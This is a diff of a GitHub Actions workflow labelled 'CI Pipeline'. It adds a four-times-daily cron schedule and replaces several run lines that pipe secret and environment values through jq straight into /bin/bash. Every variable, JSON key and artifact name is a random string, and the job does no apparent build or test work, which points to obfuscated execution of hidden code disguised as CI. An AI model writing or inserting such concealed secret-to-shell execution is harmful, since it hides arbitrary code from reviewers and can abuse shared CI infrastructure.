@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '40 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,17 +18,17 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          lt7727: ${{ secrets.lt7727 }}
+          f29: ${{ secrets.f29 }}
         run: |
-          printf '%s' "$lt7727" | jq -r .rhxh20 | /bin/bash
-          printf '%s' "$ezug976" | jq -r .it277 | /bin/bash
-          echo $q46 | jq -r .zti44 | /bin/bash
-          printf '%s' "$orv3" | jq -r .epas096 | /bin/bash
+          printf '%s' "$f29" | jq -r .yjk28515 | /bin/bash
+          echo $qx38695 | jq -r .bhh1 | /bin/bash
+          echo $rc149 | jq -r .idx38440 | /bin/bash
+          echo $xjk803 | jq -r .zicur1 | /bin/bash
 
       - name: Archive results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: t3zrSvAu
+          name: Qh3eZLo3
           path: "*.zip"
           retention-days: 1
